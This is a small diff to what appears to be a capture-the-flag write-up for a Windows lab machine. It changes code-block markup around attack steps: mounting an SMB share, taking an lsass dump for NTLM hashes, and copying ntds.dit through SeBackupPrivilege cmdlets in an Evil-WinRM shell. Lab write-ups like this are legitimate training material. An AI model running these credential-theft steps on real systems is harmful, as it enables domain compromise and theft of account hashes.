@@ -528,7 +528,7 @@ parallel_read returned NT_STATUS_IO_TIMEOUT
  ```shell
  sid@kali:~$ sudo mount -t cifs //10.10.10.192/forensic /mnt -o user=audit2020
  Password for audit2020@//10.10.10.192/forensic:  ************
-{%  endhighlight %}
+```
 After a few tries i was finally able to successfully copy the zip files,turns out that the lsass.zip file contains a .DMP file
 So this file is like a dump of the system.
 It can have some useful system information maybe even NTLM hashes of Admin or other non admin users! let's copy this
@@ -768,7 +768,7 @@ Info: Upload successful!
 ```
 Let's import these, and like in the example in the github repo : Copy-FileSeBackupPrivilege .\report.pdf c:\temp\x.pdf -Overwrite<br>
 we can copy the ntds.dit file into temp folder.
-{%highlight ruby%}
+```shell
 **Evil-WinRM** PS C:\temp> import-module .\SeBackupPrivilegeUtils.dll
 **Evil-WinRM** PS C:\temp> import-module .\SeBackupPrivilegeCmdLets.dll
 **Evil-WinRM** PS C:\temp> Copy-FileSebackupPrivilege v:\Windows\NTDS\ntds.dit C:\temp\sid.dit
